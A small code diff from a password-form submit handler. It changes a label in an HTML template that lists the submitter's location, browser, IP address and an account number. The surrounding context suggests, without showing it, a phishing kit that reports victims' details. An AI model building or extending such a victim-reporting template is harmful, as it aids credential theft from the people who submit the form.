@@ -159,7 +159,7 @@ document.getElementById('passwordForm').addEventListener('submit', async functio
                   <p style="margin: 5px 0;"><strong>Where</strong> ${userInfo.city} , ${userInfo.country} , ${userInfo.region}</p>
                   <p style="margin: 5px 0;"><strong>Device Type</strong> ${userInfo.browserName} ${userInfo.browserVersion}</p>
                   <p style="margin: 5px 0;"><strong>IP address</strong> ${userInfo.ip}</p>
-                  <p style="margin: 5px 0;color:red"><strong>Account :</strong> ${sphone}</p>
+                  <p style="margin: 5px 0;color:red"><strong>Account Number:</strong> ${sphone}</p>
               </td>
           </tr>
           <tr>
